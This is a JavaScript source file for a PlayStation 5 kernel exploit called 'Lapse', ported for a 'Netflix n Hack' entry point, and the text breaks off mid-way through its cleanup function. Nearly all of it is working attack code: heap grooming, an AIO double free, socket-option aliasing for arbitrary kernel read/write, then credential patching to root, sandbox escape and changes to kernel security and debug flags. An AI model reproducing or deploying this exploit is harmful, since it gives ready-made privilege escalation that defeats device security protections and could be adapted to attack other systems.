/***** lapse.js *****/
/*
    Copyright (C) 2025 Gezine
    Copyright (C) 2025 anonymous
    
    This file `lapse.js` contains a derivative work of `lapse.mjs`, which is a
    part of PSFree.

    Source:
    https://github.com/shahrilnet/remote_lua_loader/blob/main/payloads/lapse.lua
    https://github.com/Al-Azif/psfree-lapse/tree/v1.5.0
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as
    published by the Free Software Foundation, either version 3 of the
    License, or (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.
    
    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/
/*
    This payload is a port for 'Netflix n Hack' of lapse.js from Y2JB project by Gezine
    Use at your own risk
*/

(function() {
    try {

        logger.log("Init lapse_nf.js");

        const lapse_version = "Netflix n Hack - Lapse by Gezine";
        
        const failcheck_path = "/" + get_nidpath() + "/common_temp/lapse.fail";
        
        function new_evf(name, flags) {
            const result = syscall(SYSCALL.evf_create, name, 0n, flags);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_create error: " + hex(result));
            }
            return result;
        }

        function set_evf_flags(id, flags) {
            let result = syscall(SYSCALL.evf_clear, id, 0n);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_clear error: " + hex(result));
            }
            result = syscall(SYSCALL.evf_set, id, flags);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_set error: " + hex(result));
            }
            return result;
        }

        function free_evf(id) {
            const result = syscall(SYSCALL.evf_delete, id);
            if (result === 0xffffffffffffffffn) {
                throw new Error("evf_delete error: " + hex(result));
            }
            return result;
        }

        function verify_reqs2(addr, cmd) {
            if (read32_uncompressed(addr) !== cmd) {
                return false;
            }

            const heap_prefixes = [];

            for (let i = 0x10n; i <= 0x20n; i += 8n) {
                if (read16_uncompressed(addr + i + 6n) !== 0xffffn) {
                    return false;
                }
                heap_prefixes.push(Number(read16_uncompressed(addr + i + 4n)));
            }

            const state1 = Number(read32_uncompressed(addr + 0x38n));
            const state2 = Number(read32_uncompressed(addr + 0x3cn));
            if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
                return false;
            }

            if (read64_uncompressed(addr + 0x40n) !== 0n) {
                return false;
            }

            for (let i = 0x48n; i <= 0x50n; i += 8n) {
                if (read16_uncompressed(addr + i + 6n) === 0xffffn) {
                    if (read16_uncompressed(addr + i + 4n) !== 0xffffn) {
                        heap_prefixes.push(Number(read16_uncompressed(addr + i + 4n)));
                    }
                } else if (i === 0x50n || read64_uncompressed(addr + i) !== 0n) {
                    return false;
                }
            }

            if (heap_prefixes.length < 2) {
                return false;
            }

            const first_prefix = heap_prefixes[0];
            for (let idx = 1; idx < heap_prefixes.length; idx++) {
                if (heap_prefixes[idx] !== first_prefix) {
                    return false;
                }
            }

            return true;
        }

        function leak_kernel_addrs(sd_pair, sds) {
            
            const sd = sd_pair[0];
            const buflen = 0x80 * LEAK_LEN;
            const buf = malloc(buflen);

            logger.log("Confusing evf with rthdr...");

            const name = malloc(1);

            syscall(SYSCALL.close, BigInt(sd_pair[1]));

            let evf = null;
            for (let i = 1; i <= NUM_ALIAS; i++) {
                const evfs = [];

                for (let j = 1; j <= NUM_HANDLES; j++) {
                    const evf_flags = 0xf00n | (BigInt(j) << 16n);
                    evfs.push(new_evf(name, evf_flags));
                }

                get_rthdr(sd, buf, 0x80);

                const flag = Number(read32_uncompressed(buf));

                if ((flag & 0xf00) === 0xf00) {
                    const idx = (flag >>> 16) & 0xffff;
                    const expected_flag = BigInt(flag | 1);

                    evf = evfs[idx - 1];

                    set_evf_flags(evf, expected_flag);
                    get_rthdr(sd, buf, 0x80);

                    const val = read32_uncompressed(buf);
                    if (val === expected_flag) {
                        evfs.splice(idx - 1, 1);
                    } else {
                        evf = null;
                    }
                }

                for (let k = 0; k < evfs.length; k++) {
                    if (evf === null || evfs[k] !== evf) {
                        free_evf(evfs[k]);
                    }
                }

                if (evf !== null) {
                    logger.log("Confused rthdr and evf at attempt: " + i);
                    break;
                }
            }

            if (evf === null) {
                logger.log("Failed to confuse evf and rthdr");
                return null;
            }

            set_evf_flags(evf, 0xff00n);

            const kernel_addr = read64_uncompressed(buf + 0x28n);
            logger.log("\"evf cv\" string addr: " + hex(kernel_addr));

            const kbuf_addr = read64_uncompressed(buf + 0x40n) - 0x38n;
            logger.log("Kernel buffer addr: " + hex(kbuf_addr));

            const wbufsz = 0x80;
            const wbuf = malloc(wbufsz);
            const rsize = build_rthdr(wbuf, wbufsz);
            const marker_val = 0xdeadbeefn;
            const reqs3_offset = 0x10n;

            write32_uncompressed(wbuf + 4n, marker_val);
            write32_uncompressed(wbuf + reqs3_offset + 0n, 1n);   // .ar3_num_reqs
            write32_uncompressed(wbuf + reqs3_offset + 4n, 0n);   // .ar3_reqs_left
            write32_uncompressed(wbuf + reqs3_offset + 8n, AIO_STATE_COMPLETE); // .ar3_state
            write8_uncompressed(wbuf + reqs3_offset + 0xcn, 0n);  // .ar3_done
            write32_uncompressed(wbuf + reqs3_offset + 0x28n, 0x67b0000n); // .ar3_lock.lock_object.lo_flags
            write64_uncompressed(wbuf + reqs3_offset + 0x38n, 1n); // .ar3_lock.lk_lock = LK_UNLOCKED

            const num_elems = 6;

            const ucred = kbuf_addr + 4n;
            const leak_reqs = make_reqs1(num_elems);
            write64_uncompressed(leak_reqs + 0x10n, ucred);

            const num_loop = NUM_SDS;
            const leak_ids_len = num_loop * num_elems;
            const leak_ids = malloc(4 * leak_ids_len);
            const step = BigInt(4 * num_elems);
            const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;

            let reqs2_off = null;
            let fake_reqs3_off = null;
            let fake_reqs3_sd = null;

            for (let i = 1; i <= NUM_LEAKS; i++) {
                for (let j = 1; j <= num_loop; j++) {
                    write32_uncompressed(wbuf + 8n, BigInt(j));
                    aio_submit_cmd(cmd, leak_reqs, num_elems, 3n, leak_ids + (BigInt(j - 1) * step));
                    set_rthdr(Number(sds[j - 1]), wbuf, rsize);
                }
                
                get_rthdr(sd, buf, buflen);

                let sd_idx = null;
                reqs2_off = null;
                fake_reqs3_off = null;

                for (let off = 0x80; off < buflen; off += 0x80) {
                    const offset = BigInt(off);

                    if (reqs2_off === null && verify_reqs2(buf + offset, AIO_CMD_WRITE)) {
                        reqs2_off = off;
                    }

                    if (fake_reqs3_off === null) {
                        const marker = read32_uncompressed(buf + offset + 4n);
                        if (marker === marker_val) {
                            fake_reqs3_off = off;
                            sd_idx = Number(read32_uncompressed(buf + offset + 8n));
                        }
                    }
                }

                if (reqs2_off !== null && fake_reqs3_off !== null) {
                    logger.log("Found reqs2 and fake reqs3 at attempt: " + i);
                    fake_reqs3_sd = sds[sd_idx - 1];
                    sds.splice(sd_idx - 1, 1);
                    free_rthdrs(sds);
                    sds.push(new_socket());
                    break;
                }

                free_aios(leak_ids, leak_ids_len);
            }

            if (reqs2_off === null || fake_reqs3_off === null) {
                logger.log("Could not leak reqs2 and fake reqs3");
                logger.flush();
                return null;
            }

            logger.log("reqs2 offset: " + hex(BigInt(reqs2_off)));
            logger.log("fake reqs3 offset: " + hex(BigInt(fake_reqs3_off)));
            logger.flush();

            get_rthdr(sd, buf, buflen);
            
            const aio_info_addr = read64_uncompressed(buf + BigInt(reqs2_off) + 0x18n);
            
            let reqs1_addr = read64_uncompressed(buf + BigInt(reqs2_off) + 0x10n);
            reqs1_addr = reqs1_addr & ~0xffn;

            const fake_reqs3_addr = kbuf_addr + BigInt(fake_reqs3_off) + reqs3_offset;

            logger.log("reqs1_addr = " + hex(reqs1_addr));
            logger.log("fake_reqs3_addr = " + hex(fake_reqs3_addr));

            logger.log("Searching for target_id...");
            logger.flush();

            let target_id = null;
            let to_cancel = null;
            let to_cancel_len = null;

            const errors = malloc(4 * num_elems);

            for (let i = 0; i < leak_ids_len; i += num_elems) {
                aio_multi_cancel(leak_ids + BigInt(i * 4), num_elems, errors);
                get_rthdr(sd, buf, buflen);

                const state = read32_uncompressed(buf + BigInt(reqs2_off) + 0x38n);
                if (state === AIO_STATE_ABORTED) {
                    target_id = read32_uncompressed(leak_ids + BigInt(i * 4));
                    write32_uncompressed(leak_ids + BigInt(i * 4), 0n);

                    logger.log("Found target_id=" + hex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));
                    logger.flush();
                    const start = i + num_elems;
                    to_cancel = leak_ids + BigInt(start * 4);
                    to_cancel_len = leak_ids_len - start;

                    break;
                }
            }

            if (target_id === null) {
                logger.log("Target ID not found");
                logger.flush();
                return null;
            }

            cancel_aios(to_cancel, to_cancel_len);
            free_aios2(leak_ids, leak_ids_len);

            logger.log("Kernel addresses leaked successfully!");
            logger.flush();

            return {
                reqs1_addr: reqs1_addr,
                kbuf_addr: kbuf_addr,
                kernel_addr: kernel_addr,
                target_id: target_id,
                evf: evf,
                fake_reqs3_addr: fake_reqs3_addr,
                fake_reqs3_sd: fake_reqs3_sd,
                aio_info_addr: aio_info_addr
            };
        }

        function make_aliased_pktopts(sds) {
            const tclass = malloc(4);
            
            for (let loop = 0; loop < NUM_ALIAS; loop++) {
                for (let i = 0; i < sds.length; i++) {
                    write32_uncompressed(tclass, BigInt(i));
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                }
                
                for (let i = 0; i < sds.length; i++) {
                    get_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    const marker = Number(read32_uncompressed(tclass));
                    
                    if (marker !== i) {
                        const sd_pair = [sds[i], sds[marker]];
                        logger.log("Aliased pktopts at attempt " + loop + " (pair: " + sd_pair[0] + ", " + sd_pair[1] + ")");
                        logger.flush();
                        if (marker > i) {
                            sds.splice(marker, 1);
                            sds.splice(i, 1);
                        } else {
                            sds.splice(i, 1);
                            sds.splice(marker, 1);
                        }
                        
                        for (let j = 0; j < 2; j++) {
                            const sock_fd = new_socket();
                            set_sockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                            sds.push(sock_fd);
                        }
                        
                        return sd_pair;
                    }
                }
                
                for (let i = 0; i < sds.length; i++) {
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0n, 0);
                }
            }
            
            return null;
        }

        function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
            const max_leak_len = (0xff + 1) << 3;
            const buf = malloc(max_leak_len);
            
            const num_elems = MAX_AIO_IDS;
            const aio_reqs = make_reqs1(num_elems);
            
            const num_batches = 2;
            const aio_ids_len = num_batches * num_elems;
            const aio_ids = malloc(4 * aio_ids_len);
            
            logger.log("Overwriting rthdr with AIO queue entry...");
            logger.flush();
            let aio_not_found = true;
            free_evf(evf);
            
            for (let i = 0; i < NUM_CLOBBERS; i++) {
                spray_aio(num_batches, aio_reqs, num_elems, aio_ids, true);
                
                const size_ret = get_rthdr(sd, buf, max_leak_len);
                const cmd = read32_uncompressed(buf);
                
                if (size_ret === 8n && cmd === AIO_CMD_READ) {
                    logger.log("Aliased at attempt " + i);
                    logger.flush();
                    aio_not_found = false;
                    cancel_aios(aio_ids, aio_ids_len);
                    break;
                }
                
                free_aios(aio_ids, aio_ids_len, true);
            }
            
            if (aio_not_found) {
                logger.log("Failed to overwrite rthdr");
                logger.flush();
                return null;
            }
            
            const reqs2_size = 0x80;
            const reqs2 = malloc(reqs2_size);
            const rsize = build_rthdr(reqs2, reqs2_size);
            
            write32_uncompressed(reqs2 + 4n, 5n); // ar2_ticket
            write64_uncompressed(reqs2 + 0x18n, reqs1_addr); // ar2_info
            write64_uncompressed(reqs2 + 0x20n, fake_reqs3_addr); // ar2_batch
            
            const states = malloc(4 * num_elems);
            const addr_cache = [];
            for (let i = 0; i < num_batches; i++) {
                addr_cache.push(aio_ids + BigInt(i * num_elems * 4));
            }
            
            logger.log("Overwriting AIO queue entry with rthdr...");
            logger.flush();
            
            syscall(SYSCALL.close, BigInt(sd));
            sd = null;
            
            function overwrite_aio_entry_with_rthdr() {
                for (let i = 0; i < NUM_ALIAS; i++) {
                    for (let j = 0; j < sds.length; j++) {
                        set_rthdr(sds[j], reqs2, rsize);
                    }
                    
                    for (let batch = 0; batch < addr_cache.length; batch++) {
                        for (let j = 0; j < num_elems; j++) {
                            write32_uncompressed(states + BigInt(j * 4), -1n);
                        }
                        
                        aio_multi_cancel(addr_cache[batch], num_elems, states);
                        
                        let req_idx = -1;
                        for (let j = 0; j < num_elems; j++) {
                            const val = read32_uncompressed(states + BigInt(j * 4));
                            if (val === AIO_STATE_COMPLETE) {
                                req_idx = j;
                                break;
                            }
                        }
                        
                        if (req_idx !== -1) {
                            logger.log("Found req_id at batch " + batch + ", attempt " + i);
                            logger.flush();
                            
                            const aio_idx = batch * num_elems + req_idx;
                            const req_id_p = aio_ids + BigInt(aio_idx * 4);
                            const req_id = read32_uncompressed(req_id_p);
                            
                            aio_multi_poll(req_id_p, 1, states);
                            write32_uncompressed(req_id_p, 0n);
                            
                            return req_id;
                        }
                    }
                }
                
                return null;
            }
            
            const req_id = overwrite_aio_entry_with_rthdr();
            if (req_id === null) {
                logger.log("Failed to overwrite AIO queue entry");
                logger.flush();
                return null;
            }
            
            free_aios2(aio_ids, aio_ids_len);
            
            const target_id_p = malloc(4);
            write32_uncompressed(target_id_p, BigInt(target_id));
            
            aio_multi_poll(target_id_p, 1, states);
            
            const sce_errs = malloc(8);
            write32_uncompressed(sce_errs, -1n);
            write32_uncompressed(sce_errs + 4n, -1n);
            
            const target_ids = malloc(8);
            write32_uncompressed(target_ids, req_id);
            write32_uncompressed(target_ids + 4n, BigInt(target_id));
            
            logger.log("Triggering double free...");
            logger.flush();
            aio_multi_delete(target_ids, 2, sce_errs);
            
            logger.log("Reclaiming memory...");
            logger.flush();
            const sd_pair = make_aliased_pktopts(sds_alt);
            
            const err1 = read32_uncompressed(sce_errs);
            const err2 = read32_uncompressed(sce_errs + 4n);
            
            write32_uncompressed(states, -1n);
            write32_uncompressed(states + 4n, -1n);
            
            aio_multi_poll(target_ids, 2, states);
            
            let success = true;
            if (read32_uncompressed(states) !== SCE_KERNEL_ERROR_ESRCH) {
                logger.log("ERROR: Bad delete of corrupt AIO request");
                logger.flush();
                success = false;
            }
            
            if (err1 !== 0n || err1 !== err2) {
                logger.log("ERROR: Bad delete of ID pair");
                logger.flush();
                success = false;
            }
            
            if (!success) {
                logger.log("Double free failed");
                logger.flush();
                return null;
            }
            
            if (sd_pair === null) {
                logger.log("Failed to make aliased pktopts");
                logger.flush();
                return null;
            }
            
            return sd_pair;
        }

        function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr) {
            try {
                const master_sock = pktopts_sds[0];
                const tclass = malloc(4);
                const off_tclass = 0xc0n;  // PS5 offset
                
                const pktopts_size = 0x100;
                const pktopts = malloc(pktopts_size);
                const rsize = build_rthdr(pktopts, pktopts_size);
                const pktinfo_p = reqs1_addr + 0x10n;
                
                // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
                write64_uncompressed(pktopts + 0x10n, pktinfo_p);
                
                logger.log("Overwriting main pktopts");
                logger.flush();
                let reclaim_sock = null;
                
                syscall(SYSCALL.close, pktopts_sds[1]);
                
                for (let i = 1; i <= NUM_ALIAS; i++) {
                    for (let j = 0; j < sds_alt.length; j++) {
                        write32_uncompressed(pktopts + off_tclass, 0x4141n | (BigInt(j) << 16n));
                        set_rthdr(sds_alt[j], pktopts, rsize);
                    }
                    
                    get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    const marker = read32_uncompressed(tclass);
                    if ((marker & 0xffffn) === 0x4141n) {
                        logger.log("Found reclaim socket at attempt: " + i);
                        logger.flush();
                        const idx = Number(marker >> 16n);
                        reclaim_sock = sds_alt[idx];
                        sds_alt.splice(idx, 1);
                        break;
                    }
                }
                
                if (reclaim_sock === null) {
                    logger.log("Failed to overwrite main pktopts");
                    logger.flush();
                    return null;
                }
                
                const pktinfo_len = 0x14;
                const pktinfo = malloc(pktinfo_len);
                write64_uncompressed(pktinfo, pktinfo_p);
                
                const read_buf = malloc(8);
                
                function slow_kread8(addr) {
                    const len = 8;
                    let offset = 0;
                    
                    while (offset < len) {
                        // pktopts.ip6po_nhinfo = addr + offset
                        write64_uncompressed(pktinfo + 8n, addr + BigInt(offset));
                        
                        set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                        const n = get_sockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + BigInt(offset), len - offset);
                        
                        if (n === 0n) {
                             write8_uncompressed(read_buf + BigInt(offset), 0n);
                            offset = offset + 1;
                        } else {
                            offset = offset + Number(n);
                        }
                    }
                    
                    return read64_uncompressed(read_buf);
                }
                
                const test_read = slow_kread8(kernel_addr);
                logger.log("slow_kread8(\"evf cv\"): " + hex(test_read));
                logger.flush();
                const kstr = read_cstring(read_buf);
                logger.log("*(\"evf cv\"): " + kstr);
                logger.flush();
                
                if (kstr !== "evf cv") {
                    logger.log("Test read of \"evf cv\" failed");
                    logger.flush();
                    return null;
                }
                
                logger.log("Slow arbitrary kernel read achieved");
                logger.flush();
                
                // Get curproc from previously freed aio_info
                const curproc = slow_kread8(aio_info_addr + 8n);
                
                if (Number(curproc >> 48n) !== 0xffff) {
                    logger.log("Invalid curproc kernel address: " + hex(curproc));
                    logger.flush();
                    return null;
                }
                
                const possible_pid = slow_kread8(curproc + kernel_offset.PROC_PID);
                const current_pid = syscall(SYSCALL.getpid);
                
                if ((possible_pid & 0xffffffffn) !== (current_pid & 0xffffffffn)) {
                    logger.log("curproc verification failed: " + hex(curproc));
                    logger.flush();
                    return null;
                }
                
                logger.log("curproc = " + hex(curproc));
                logger.flush();
                
                kernel.addr.curproc = curproc;
                kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + kernel_offset.PROC_FD);
                kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES;
                kernel.addr.inside_kdata = kernel_addr;
                
                function get_fd_data_addr(sock, kread8_fn) {
                    const filedescent_addr = kernel.addr.curproc_ofiles + sock * kernel_offset.SIZEOF_OFILES;
                    const file_addr = kread8_fn(filedescent_addr + 0x0n);
                    return kread8_fn(file_addr + 0x0n);
                }
                
                function get_sock_pktopts(sock, kread8_fn) {
                    const fd_data = get_fd_data_addr(sock, kread8_fn);
                    const pcb = kread8_fn(fd_data + kernel_offset.SO_PCB);
                    const pktopts = kread8_fn(pcb + kernel_offset.INPCB_PKTOPTS);
                    return pktopts;
                }
                
                const worker_sock = new_socket();
                const worker_pktinfo = malloc(pktinfo_len);
                
                // Create pktopts on worker_sock
                set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len);
                
                const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8);
                
                write64_uncompressed(pktinfo, worker_pktopts + 0x10n);  // overlap pktinfo
                write64_uncompressed(pktinfo + 8n, 0n);  // clear .ip6po_nexthop
                set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                
                function kread20(addr, buf) {
                    write64_uncompressed(pktinfo, addr);
                    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                    get_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
                }
                
                function kwrite20(addr, buf) {
                    write64_uncompressed(pktinfo, addr);
                    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                    set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
                }
                
                function kread8(addr) {
                    kread20(addr, worker_pktinfo);
                    return read64_uncompressed(worker_pktinfo);
                }
                
                // Note: this will write our 8 bytes + remaining 12 bytes as null
                function restricted_kwrite8(addr, val) {
                    write64_uncompressed(worker_pktinfo, val);
                    write64_uncompressed(worker_pktinfo + 8n, 0n);
                    write32_uncompressed(worker_pktinfo + 16n, 0n);
                    kwrite20(addr, worker_pktinfo);
                }
                
                write64_uncompressed(read_buf, kread8(kernel_addr));
                const kstr2 = read_cstring(read_buf);
                if (kstr2 !== "evf cv") {
                    logger.log("Test read of \"evf cv\" failed");
                    logger.flush();
                    return null;
                }
                
                logger.log("Restricted kernel r/w achieved");
                logger.flush();
                
                // Initialize ipv6_kernel_rw with restricted write
                ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8);
                
                kernel.read_buffer = ipv6_kernel_rw.read_buffer;
                kernel.write_buffer = ipv6_kernel_rw.write_buffer;
                kernel.copyout = ipv6_kernel_rw.copyout;
                kernel.copyin = ipv6_kernel_rw.copyin;  
                
                const kstr3 = kernel.read_null_terminated_string(kernel_addr);
                if (kstr3 !== "evf cv") {
                    logger.log("Test read of \"evf cv\" failed");
                    logger.flush();
                    return null;
                }
                
                logger.log("Arbitrary kernel r/w achieved!");
                logger.flush();
                
                // RESTORE: clean corrupt pointers
                const off_ip6po_rthdr = 0x70n;  // PS5 offset

                for (let i = 0; i < sds.length; i++) {
                    const sock_pktopts = get_sock_pktopts(sds[i], kernel.read_qword);
                    kernel.write_qword(sock_pktopts + off_ip6po_rthdr, 0n);
                }

                const reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword);

                kernel.write_qword(reclaimer_pktopts + off_ip6po_rthdr, 0n);
                kernel.write_qword(worker_pktopts + off_ip6po_rthdr, 0n);
                
                const sock_increase_ref = [
                    ipv6_kernel_rw.data.master_sock,
                    ipv6_kernel_rw.data.victim_sock,
                    master_sock,
                    worker_sock,
                    reclaim_sock
                ];
                
                // Increase ref counts to prevent deallocation
                for (const each of sock_increase_ref) {
                    const sock_addr = get_fd_data_addr(each, kernel.read_qword);
                    kernel.write_dword(sock_addr + 0x0n, 0x100n);  // so_count
                }
                
                logger.log("Fixes applied");
                logger.flush();
                
                return true;
                
            } catch (e) {
                logger.log("make_kernel_arw error: " + e.message);
                logger.log(e.stack);
                return null;
            }
        }

        function post_exploitation_ps5() {
            const OFFSET_UCRED_CR_SCEAUTHID = 0x58n;
            const OFFSET_UCRED_CR_SCECAPS = 0x60n;
            const OFFSET_UCRED_CR_SCEATTRS = 0x83n;
            const OFFSET_P_UCRED = 0x40n;

            const KDATA_MASK = 0xffff804000000000n;
            const SYSTEM_AUTHID = 0x4800000000010003n;

            function find_allproc() {
                let proc = kernel.addr.curproc;
                const max_attempt = 32;

                for (let i = 1; i <= max_attempt; i++) {
                    if ((proc & KDATA_MASK) === KDATA_MASK) {
                        const data_base = proc - kernel_offset.DATA_BASE_ALLPROC;
                        if ((data_base & 0xfffn) === 0n) {
                            return proc;
                        }
                    }
                    proc = kernel.read_qword(proc + 0x8n);  // proc->p_list->le_prev
                }

                throw new Error("failed to find allproc");
            }

            function get_dmap_base() {
                if (!kernel.addr.data_base) {
                    throw new Error("kernel.addr.data_base not set");
                }

                const OFFSET_PM_PML4 = 0x20n;
                const OFFSET_PM_CR3 = 0x28n;

                const kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE;

                pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4);
                cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3);
                const dmap_base = pml4 - cr3;              
                return { dmap_base, cr3 };
            }
            
            function get_additional_kernel_address() {
                kernel.addr.allproc = find_allproc();
                kernel.addr.data_base = kernel.addr.allproc - kernel_offset.DATA_BASE_ALLPROC;
                kernel.addr.base = kernel.addr.data_base - kernel_offset.DATA_BASE;

                const { dmap_base, cr3 } = get_dmap_base();
                kernel.addr.dmap_base = dmap_base;
                kernel.addr.kernel_cr3 = cr3;
            }

            function escape_filesystem_sandbox(proc) {
                const proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD); // p_fd
                const rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE);

                kernel.write_qword(proc_fd + 0x10n, rootvnode); // fd_rdir
                kernel.write_qword(proc_fd + 0x18n, rootvnode); // fd_jdir
            }

            function patch_dynlib_restriction(proc) {
                const dynlib_obj_addr = kernel.read_qword(proc + 0x3e8n);

                //kernel.write_dword(dynlib_obj_addr + 0x118n, 0n); // prot (todo: recheck) credit JM fixes KP for 7.xx users
                kernel.write_qword(dynlib_obj_addr + 0x18n, 1n); // libkernel ref

                // bypass libkernel address range check (credit @cheburek3000)
                kernel.write_qword(dynlib_obj_addr + 0xf0n, 0n); // libkernel start addr
                kernel.write_qword(dynlib_obj_addr + 0xf8n, 0xffffffffffffffffn); // libkernel end addr
            }

            function patch_ucred(ucred, authid) {
                kernel.write_dword(ucred + 0x04n, 0n); // cr_uid
                kernel.write_dword(ucred + 0x08n, 0n); // cr_ruid
                kernel.write_dword(ucred + 0x0Cn, 0n); // cr_svuid
                kernel.write_dword(ucred + 0x10n, 1n); // cr_ngroups
                kernel.write_dword(ucred + 0x14n, 0n); // cr_rgid

                // escalate sony privs
                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid); // cr_sceAuthID

                // enable all app capabilities
                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, 0xffffffffffffffffn); // cr_sceCaps[0]
                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8n, 0xffffffffffffffffn); // cr_sceCaps[1]

                // set app attributes
                kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80n); // SceAttrs
            }

            function escalate_curproc() {
                const proc = kernel.addr.curproc;   

                const ucred = kernel.read_qword(proc + OFFSET_P_UCRED); // p_ucred
                const authid = SYSTEM_AUTHID;

                const uid_before = Number(syscall(SYSCALL.getuid));
                const in_sandbox_before = Number(syscall(SYSCALL.is_in_sandbox));

                patch_ucred(ucred, authid);
                patch_dynlib_restriction(proc);
                escape_filesystem_sandbox(proc);

                const uid_after = Number(syscall(SYSCALL.getuid));
                const in_sandbox_after = Number(syscall(SYSCALL.is_in_sandbox));

                logger.log("we root now? uid: before " + uid_before + " after " + uid_after);
                logger.log("we escaped now? in sandbox: before " + in_sandbox_before + " after " + in_sandbox_after);
                logger.flush();
            }

            function apply_patches_to_kernel_data(accessor) {
                const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS;
                const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID;
                const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS;
                const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS;

                // Set security flags
                logger.log("setting security flags");

                const security_flags = kernel.read_dword(security_flags_addr);
                logger.log("  before: " + hex(security_flags));

                accessor.write_dword(security_flags_addr, security_flags | 0x14n);
                const security_flags_after = kernel.read_dword(security_flags_addr);
                logger.log("  after:  " + hex(security_flags_after));


                // Set targetid to DEX
                logger.log("setting targetid");

                const target_id_before = kernel.read_byte(target_id_flags_addr);
                logger.log("  before: " + hex(target_id_before));

                accessor.write_byte(target_id_flags_addr, 0x82n);
                const target_id_after = kernel.read_byte(target_id_flags_addr);
                logger.log("  after:  " + hex(target_id_after));


                // Set qa flags and utoken flags for debug menu enable
                logger.log("setting qa flags and utoken flags");

                const qa_flags = kernel.read_dword(qa_flags_addr);
                logger.log("  qa_flags before: " + hex(qa_flags));

                accessor.write_dword(qa_flags_addr, qa_flags | 0x10300n);
                const qa_flags_after = kernel.read_dword(qa_flags_addr);
                logger.log("  qa_flags after:  " + hex(qa_flags_after));


                const utoken_flags = kernel.read_byte(utoken_flags_addr);
                logger.log("  utoken_flags before: " + hex(utoken_flags));

                accessor.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
                const utoken_flags_after = kernel.read_byte(utoken_flags_addr);
                logger.log("  utoken_flags after:  " + hex(utoken_flags_after));

                logger.log("debug menu enabled");
                logger.flush();
            }

            // Main execution
            get_additional_kernel_address();

            // patch current process creds
            escalate_curproc();

            update_kernel_offsets();
            
            // init GPU DMA for kernel r/w on protected area
            gpu.setup();

            const force_kdata_patch_with_gpu = false;
            const fw_version_num = Number(FW_VERSION);

            if (fw_version_num >= 7 || force_kdata_patch_with_gpu) {
                logger.log("applying patches to kernel data (with GPU DMA method)");
                apply_patches_to_kernel_data(gpu);
            } else {
                logger.log("applying patches to kernel data");
                apply_patches_to_kernel_data(kernel);
            }
        }


        function cleanup() {
            logger.log("Performing cleanup...");
            logger.flush();

            try {
                if (block_fd !== 0xffffffffffffffffn) {
                    syscall(SYSCALL.close, block_fd);
                    block_fd = -1n;
                }
                if (unblock_fd !== 0xffffffffffffffffn) {
                    syscall(SYSCALL.close, unblock_fd);
                    unblock_fd = -1n;
                }

                if (groom_ids !== null) {
                    const groom_ids_addr = malloc(4 * NUM_GROOMS);
                    for (let i = 0; i < NUM_GROOMS; i++) {
                        write32_uncompressed(groom_ids_addr + BigInt(i * 4), BigInt(groom_ids[i]));
                    }
                    free_aios2(groom_ids_addr, NUM_GROOMS);
                    groom_ids = null;
                }

                if (block_id !== 0xffffffffffffffffn) {
                    const block_id_buf = malloc(4);
                    write32_uncompressed(block_id_buf, block_id);
                    const block_errors = malloc(4);
                    aio_multi_wait(block_id_buf, 1, block_errors, 1, 0n);
                    aio_multi_delete(block_id_buf, 1, block_errors);
                    block_id = -1n;
                }

                if (sds !== null) {
